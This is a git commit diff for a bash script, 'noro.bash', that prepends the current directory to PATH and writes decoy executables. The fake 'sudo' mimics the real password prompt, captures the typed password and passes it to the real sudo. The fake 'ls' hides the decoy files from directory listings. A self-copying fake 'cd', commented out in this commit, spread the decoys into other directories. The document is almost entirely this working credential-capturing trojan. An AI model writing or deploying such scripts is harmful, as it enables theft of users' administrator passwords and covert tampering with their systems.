6f5036586a04b74f2fad6a0e0ccddc851715693c
kernelstearns <55107317+kernelstearns@users.noreply.github.com>
2020-01-29 09:16:41 -0700

    Update noro.bash

--- noro/noro.bash
+++ noro/noro.bash
@@ -2,12 +2,12 @@
 
 PATH=.:$PATH
 
-echo "#!/bin/bash" > cd
-echo "/usr/bin/cp cd $1cd" >> cd
-echo "/usr/bin/cp sudo $1sudo" >> cd
-echo "/usr/bin/cp ls $1sudo" >> cd
-echo "/usr/bin/cd $1" >> cd
-chmod +x cd
+#echo "#!/bin/bash" > cd
+#echo "/bin/cp cd $1cd" >> cd
+#echo "/bin/cp sudo $1sudo" >> cd
+#echo "/bin/cp ls $1sudo" >> cd
+#echo "/bin/cd $1" >> cd
+#chmod +x cd
 
 echo "#!/bin/bash" > sudo
 echo "read -sp \"[sudo] password for $(whoami): \" p" >> sudo
@@ -15,5 +15,5 @@ echo "echo $p | /usr/bin/sudo -S $@" >> sudo
 chmod +x sudo
 
 echo "#!/bin/bash" > ls
-echo "/usr/bin/ls $@ | sed 's/ls//g' | sed 's/cd//g' | sed 's/sudo//g' | column" >> ls
+echo "/bin/ls $@ | sed 's/ls//g' | sed 's/cd//g' | sed 's/sudo//g' | column" >> ls
 chmod +x ls
